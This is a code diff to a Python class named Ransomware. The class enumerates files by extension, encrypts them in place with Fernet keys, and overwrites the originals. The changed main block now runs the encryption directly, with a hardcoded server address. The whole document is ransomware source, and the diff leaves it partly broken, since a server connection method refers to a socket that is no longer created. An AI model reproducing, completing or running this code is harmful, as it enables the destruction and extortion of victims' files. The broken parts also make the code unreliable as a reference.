@@ -6,22 +6,24 @@ import shutil
 from time import sleep
 from pathlib import Path
 from typing import Dict, List
-from lib.modules.system import System
+from lib.modules.terminal import System
 from lib.modules.yaml import safe_load
 from lib.cryptography.fernet import Fernet
-from socket import socket, AF_INET, SOCK_STREAM
 
 
-class Ransomware(Fernet):
+class Ransomware():
     
-    def __init__(self, host: str, port: int) -> None:
+    def __init__(
+        self, 
+        host: str, 
+        port: int
+    ) -> None:
         self.key = Fernet.generate_key()
+        self.fernet = Fernet(self.key)
         self.host = host
         self.port = port
-        self.system: System = System()
-        self.server: socket = socket(AF_INET, SOCK_STREAM)
         self.Private = Fernet(self.key)
-        self.list_file()
+        self.file_categories = {'code': ['scripts/extensions.yaml']}
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
@@ -40,12 +42,6 @@ class Ransomware(Fernet):
                 self.server.close()
 
     def list_file(self) -> Dict[str, List[str]]:
-        """
-        Lists files in the user's home directory categorized by file extension.
-
-        Returns:
-            Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
-        """
         with open('scripts/extensions.yaml', 'r') as file:
             exts = safe_load(file)
 
@@ -56,13 +52,10 @@ class Ransomware(Fernet):
             if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                 self.file_categories[extcategory[ext]].append(str(entry))
 
-    def process_files(self, mode: str) -> None:
-        """
-        Encrypts or decrypts files based on the specified mode.
-
-        Args:
-            mode (str): Either 'encrypt' or 'decrypt'.
-        """
+    def process_files(
+        self, 
+        mode: str
+    ) -> None:
         for _, files in self.file_categories.items():
             for file in files:
                 temp_file = file + '.temp'
@@ -72,29 +65,17 @@ class Ransomware(Fernet):
                             chunk = original_file.read(1024 * 1024 * 10)  # Đọc từng phần của tệp
                             if not chunk:
                                 break
-                            processed_chunk = self.encode(chunk) if mode == 'encrypt' else self.decode(chunk)
+                            processed_chunk = self.fernet.encrypt(chunk) if mode == 'encrypt' else self.fernet.decrypt(chunk)
                             temp_file.write(processed_chunk)
                     shutil.move(temp_file.name, file)
                 except Exception:
                     if os.path.exists(temp_file.name):
                         os.remove(temp_file.name)
     
-    def encrypt(self) -> None:
-        """
-        Encrypts files using Fernet encryption.
-
-        Args:
-            Private (Fernet): An instance of the Fernet class.
-        """
+    def encrypted(self) -> None:
         self.process_files('encrypt')
     
-    def decrypt(self) -> None:
-        """
-        Decrypts files using Fernet decryption.
-
-        Args:
-            Private (Fernet): An instance of the Fernet class.
-        """
+    def decrypted(self) -> None:
         self.process_files('decrypt')
     
     
@@ -102,5 +83,4 @@ class Ransomware(Fernet):
 
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
-    #bot.ConnectServer()
-    #bot.Encrypted()
+    bot.encrypted()
